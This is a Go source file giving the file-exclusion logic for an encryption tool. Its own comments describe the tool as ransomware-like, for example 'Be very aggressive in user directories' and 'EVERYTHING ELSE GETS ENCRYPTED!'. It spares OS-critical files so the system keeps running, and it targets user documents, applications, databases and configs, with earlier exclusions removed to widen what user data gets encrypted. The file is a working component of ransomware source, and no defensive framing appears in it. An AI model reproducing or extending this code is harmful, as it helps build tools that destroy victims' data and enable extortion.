package system

import (
	"path/filepath"
	"runtime"
	"strings"
)

type Exclusions struct {
	patterns map[string]bool
	enabled  bool
}

func NewExclusions(enabled bool) *Exclusions {
	e := &Exclusions{
		patterns: make(map[string]bool),
		enabled:  enabled,
	}

	if enabled {
		e.loadSystemExclusions()
	}

	return e
}

func (e *Exclusions) loadSystemExclusions() {
	// CRITICAL SYSTEM PROTECTION - Never encrypt these
	criticalExclusions := []string{
		// System executables and libraries
		"kernel", "vmlinuz", "initrd", "initramfs", "systemd", "init",
		"libc", "libssl", "libcrypto", "ld-linux", "ld.so",
		
		// Boot and system configuration
		"grub", "efi", "boot", "bootmgr", "ntldr", "bootcamp",
		"fstab", "passwd", "shadow", "group", "hosts", "resolv.conf",
		"sudoers", "crontab", "inittab", "mtab", "cpuinfo", "meminfo",
		
		// Device and hardware files
		"dev", "proc", "sys", "run", "mnt", "media",
		
		// Critical databases and logs
		"wtmp", "btmp", "lastlog", "utmp", "utmpx",
		"secure", "messages", "syslog", "kern.log", "auth.log",
		
		// Network and security
		"ssh_host_key", "ssl", "tls", "ca-certificates", "certificates",
		"keychain", "keyring", "gnupg", "ssh", ".ssh",
		
		// Package managers and system tools
		"dpkg", "rpm", "yum", "apt", "pacman", "portage", "homebrew",
		"systemctl", "service", "launchd", "launchctl",
	}

	// Common exclusions across all platforms
	commonExclusions := []string{
		// System-specific hidden files (keep these excluded)
		".", "..", ".DS_Store", ".Trash", ".Trashes", ".fseventsd", ".Spotlight-V100",
		".TemporaryItems", ".VolumeIcon.icns", ".com.apple.timemachine.donotpresent",
		".apdisk", ".metadata_never_index", ".localized",

		// System databases and indices (macOS specific)
		"Spotlight-V100", "com.apple.LaunchServices", "com.apple.dock",

		// Only critical system temp directories (not user caches/temp)
		// Note: removed "cache", "caches", "build", "dist", etc. to allow user data encryption
		
		// Editor swap/backup files (these are usually unwanted)
		".swp", ".swo", "~",
		
		// Only large package management caches that are easily rebuilt
		"node_modules", "__pycache__", ".tox",
		
		// Only system package management directories
		".npm", ".yarn", ".cargo", ".go", ".gem", ".pip",
	}

	// Add all exclusions
	allExclusions := append(criticalExclusions, commonExclusions...)
	for _, pattern := range allExclusions {
		e.patterns[strings.ToLower(pattern)] = true
	}

	// Platform-specific exclusions
	switch runtime.GOOS {
	case "darwin":
		e.loadMacOSExclusions()
	case "linux":
		e.loadLinuxExclusions()
	case "windows":
		e.loadWindowsExclusions()
	}
}

func (e *Exclusions) loadMacOSExclusions() {
	macExclusions := []string{
		// macOS system directories
		"System", "Library", "Applications", "Users", "Volumes", "bin", "sbin",
		"usr", "var", "etc", "opt", "private", "cores", "dev", "home",
		"net", "tmp", "mnt", "proc", "root", "run", "srv", "sys",

		// Application bundles and frameworks
		".app", ".framework", ".bundle", ".kext", ".plugin",

		// macOS system files
		"com.apple.LaunchServices-*.csstore", "com.apple.timemachine.donotpresent",
		"com.apple.timemachine.supported", "com.apple.timemachine.tcc",
		"com.apple.timemachine.tcc.db", "com.apple.timemachine.tcc.db-wal",
		"com.apple.timemachine.tcc.db-shm", "com.apple.timemachine.tcc.db-journal",
	}

	for _, pattern := range macExclusions {
		e.patterns[strings.ToLower(pattern)] = true
	}
}

func (e *Exclusions) loadLinuxExclusions() {
	linuxExclusions := []string{
		// Linux system directories (NEVER encrypt these)
		"bin", "sbin", "boot", "dev", "etc", "lib", "lib64", "lib32",
		"libx32", "media", "mnt", "opt", "proc", "root", "run", "srv", "sys",
		"tmp", "usr", "var", "snap", "sysroot", "selinux", "cgroup", "cgroup2",
		
		// Critical system subdirectories
		"systemd", "udev", "dbus", "polkit", "NetworkManager", "ModemManager",
		"bluetooth", "pulse", "alsa", "X11", "wayland", "gdm", "lightdm",
		"cups", "avahi", "chrony", "ntp", "rsyslog", "logrotate",
		
		// Package management and repositories
		"dpkg", "apt", "yum", "dnf", "rpm", "pacman", "zypper", "emerge", "portage",
		".apt", ".yum", ".rpm", ".pacman", ".zypper", ".emerge", "alternatives",
		"dpkg.d", "apt.d", "yum.repos.d", "zypp", "portage",
		
		// Security and authentication
		"pam.d", "security", "sudoers.d", "polkit-1", "apparmor", "selinux",
		"ssl", "ca-certificates", "certs", "private",
		
		// Hardware and kernel modules
		"modules", "firmware", "modprobe.d", "udev", "systemd",
		"dracut", "initramfs-tools", "mkinitcpio",
		
		// System databases and runtime
		".directory", "lost+found", "aquota.user", "aquota.group",
		"core", "nohup.out", "dmesg", "kern.log", "syslog",
		
		// Only system-level virtualization (not user containers/VMs)
		"libvirt", "qemu", "xen", "kvm",
		
		// Desktop environments (system parts)
		"gnome", "kde", "xfce", "mate", "cinnamon", "lxde", "openbox",
		"i3", "sway", "awesome", "dwm", "bspwm",
	}

	for _, pattern := range linuxExclusions {
		e.patterns[strings.ToLower(pattern)] = true
	}
}

func (e *Exclusions) loadWindowsExclusions() {
	windowsExclusions := []string{
		// Windows system directories
		"Windows", "Program Files", "Program Files (x86)", "ProgramData",
		"System32", "SysWOW64", "System Volume Information", "Recovery",
		"Boot", "PerfLogs", "Documents and Settings", "Users", "Public",
		"AppData", "Local Settings", "Application Data", "Cookies",
		"NetHood", "PrintHood", "Recent", "SendTo", "Start Menu",
		"Templates", "My Documents", "My Music", "My Pictures", "My Videos",

		// Windows system files
		"pagefile.sys", "hiberfil.sys", "swapfile.sys", "Thumbs.db",
		"desktop.ini", "folder.htt", "folder.ico", "folder.ini",

		// Windows temporary and cache
		"Temp", "Temporary Internet Files", "Cookies", "History",
		"Local Settings", "Application Data", "AppData", "Roaming",
		"LocalLow", "Microsoft", "Windows", "System32", "SysWOW64",
	}

	for _, pattern := range windowsExclusions {
		e.patterns[strings.ToLower(pattern)] = true
	}
}

func (e *Exclusions) ShouldSkip(path string) bool {
	if !e.enabled {
		return false
	}

	// Get absolute path to check for system directories
	absPath, _ := filepath.Abs(path)
	cleanPath := filepath.Clean(absPath)
	
	// CRITICAL: Never encrypt anything in system root directories
	if e.isSystemRootPath(cleanPath) {
		return true
	}

	// Get filename and directory components
	filename := strings.ToLower(filepath.Base(path))
	ext := strings.ToLower(filepath.Ext(path))

	// Check filename patterns
	if e.patterns[filename] {
		return true
	}

	// Check extension patterns
	if ext != "" && e.patterns[ext] {
		return true
	}

	// RANSOMWARE-LIKE BEHAVIOR: Be very aggressive in user directories
	if e.isUserDirectory(cleanPath) {
		// In user directories, only skip critical security files
		return e.isCriticalSecurityFile(filename, ext)
	}

	// For non-user directories, be more restrictive but still allow build/cache/etc
	// Skip only specific dangerous hidden files (not all hidden files)
	dangerousHiddenFiles := []string{
		".ssh", ".gnupg", ".keychain", ".keyring", 
		".certificates", ".ca-certificates", ".ssl",
		".bashrc", ".zshrc", ".profile", ".bash_profile",
		".xinitrc", ".xsession", ".dmrc",
	}
	
	if strings.HasPrefix(filename, ".") && filename != "." && filename != ".." {
		for _, dangerous := range dangerousHiddenFiles {
			if filename == dangerous || strings.HasPrefix(filename, dangerous+".") {
				return true
			}
		}
	}

	// Skip system and executable files
	if e.isDangerousFile(filename, ext) {
		return true
	}

	// Skip files with dangerous extensions
	if e.isDangerousExtension(ext) {
		return true
	}

	// Skip very large files that might be system files
	if e.isLikelySystemFile(path, filename, ext) {
		return true
	}

	return false
}

// isUserDirectory checks if the path is in a user directory where we should be more permissive
func (e *Exclusions) isUserDirectory(path string) bool {
	pathLower := strings.ToLower(path)
	
	// Common user directory patterns
	userPaths := []string{
		"/users/", "/home/", "/user/",
		"\\users\\", "\\user\\",
		"/documents/", "/desktop/", "/downloads/", "/pictures/", "/music/", "/videos/",
		"\\documents\\", "\\desktop\\", "\\downloads\\", "\\pictures\\", "\\music\\", "\\videos\\",
	}
	
	for _, userPath := range userPaths {
		if strings.Contains(pathLower, userPath) {
			return true
		}
	}
	
	return false
}

// isCriticalSecurityFile checks for files that should never be encrypted even in user directories
func (e *Exclusions) isCriticalSecurityFile(filename, ext string) bool {
	// Only the most critical security files - be very minimal here
	criticalFiles := []string{
		".ssh", ".gnupg", ".keychain", ".keyring",
		".certificates", ".ca-certificates", ".ssl",
		// Shell configs that could lock user out
		".bashrc", ".zshrc", ".profile", ".bash_profile",
	}
	
	for _, critical := range criticalFiles {
		if filename == critical || strings.HasPrefix(filename, critical+".") {
			return true
		}
	}
	
	// Critical extensions that should never be encrypted
	criticalExts := []string{
		".key", ".pem", ".crt", ".cert", ".p12", ".pfx",
	}
	
	for _, critExt := range criticalExts {
		if ext == critExt {
			return true
		}
	}
	
	return false
}

// isSystemRootPath checks if the path is in a critical system directory
func (e *Exclusions) isSystemRootPath(path string) bool {
	// Convert to forward slashes for consistent checking
	path = strings.ReplaceAll(path, "\\", "/")
	pathLower := strings.ToLower(path)
	
	systemPaths := []string{
		"/bin", "/sbin", "/boot", "/dev", "/etc", "/lib", "/lib64", "/lib32",
		"/proc", "/run", "/sys", "/usr/bin", "/usr/sbin", "/usr/lib", "/usr/lib64",
		"/var/lib", "/var/run", "/var/log", "/var/cache", "/opt/bin", "/opt/sbin",
	}
	
	// Windows system paths
	if runtime.GOOS == "windows" {
		windowsSystemPaths := []string{
			"c:/windows", "c:/program files", "c:/program files (x86)",
			"c:/programdata", "c:/system volume information", "c:/recovery",
			"c:/boot", "c:/perflogs", "c:/users/all users", "c:/users/default",
		}
		systemPaths = append(systemPaths, windowsSystemPaths...)
	}
	
	// macOS system paths
	if runtime.GOOS == "darwin" {
		macSystemPaths := []string{
			"/system", "/library", "/applications", "/bin", "/sbin", "/usr",
			"/var", "/etc", "/opt", "/private", "/cores", "/dev", "/volumes",
		}
		systemPaths = append(systemPaths, macSystemPaths...)
	}
	
	for _, sysPath := range systemPaths {
		if strings.HasPrefix(pathLower, sysPath+"/") || pathLower == sysPath {
			return true
		}
	}
	
	return false
}

// isDangerousFile checks if a file is potentially dangerous to encrypt
func (e *Exclusions) isDangerousFile(filename, ext string) bool {
	dangerousFiles := []string{
		"kernel", "vmlinuz", "initrd", "initramfs", "bootmgr", "ntldr",
		"grub", "lilo", "syslinux", "systemd", "init", "launchd",
		"passwd", "shadow", "group", "sudoers", "hosts", "fstab",
		"crontab", "inittab", "mtab", "resolv.conf",
	}
	
	for _, dangerous := range dangerousFiles {
		if strings.Contains(filename, dangerous) {
			return true
		}
	}
	
	return false
}

// isDangerousExtension checks for file extensions that should never be encrypted
func (e *Exclusions) isDangerousExtension(ext string) bool {
	dangerousExts := []string{
		// RANSOMWARE-LIKE: ONLY truly critical system files that would break the OS
		
		// Windows critical system files (keep these to avoid breaking Windows)
		".sys", ".drv", ".dll", // Core system drivers and libraries
		
		// Unix/Linux critical system files (keep these to avoid breaking Linux)
		".so", ".ko", // System libraries and kernel modules
		
		// macOS critical system files (keep these to avoid breaking macOS)
		".kext", // Kernel extensions
		
		// EVERYTHING ELSE GETS ENCRYPTED! Including:
		// - User apps: .exe, .app, .bin, .run
		// - User packages: .deb, .rpm, .pkg, .dmg, .msi
		// - User configs: .conf, .cfg, .ini, .plist, .reg
		// - User databases: .db, .sqlite, .sqlite3, .journal, .wal, .shm
		// - User scripts: .bat, .cmd, .ps1, .vbs, .js
		// - User frameworks: .framework, .bundle
	}
	
	for _, dangerousExt := range dangerousExts {
		if ext == dangerousExt {
			return true
		}
	}
	
	return false
}

// isLikelySystemFile uses heuristics to identify system files
func (e *Exclusions) isLikelySystemFile(path, filename, ext string) bool {
	// Files with no extension in system-like directories
	if ext == "" && (strings.Contains(path, "/bin/") || strings.Contains(path, "/sbin/") || 
		strings.Contains(path, "\\System32\\") || strings.Contains(path, "\\SysWOW64\\")) {
		return true
	}
	
	// Files that look like system files (only critical system files)
	systemPatterns := []string{
		"system", "kernel", "driver", "service", "daemon", "registry",
		// Removed "config", "cache", "log" to allow user data encryption
		// Only keep truly dangerous system patterns
	}
	
	filenameLower := strings.ToLower(filename)
	for _, pattern := range systemPatterns {
		if strings.Contains(filenameLower, pattern) {
			return true
		}
	}
	
	return false
}

func (e *Exclusions) IsEnabled() bool {
	return e.enabled
}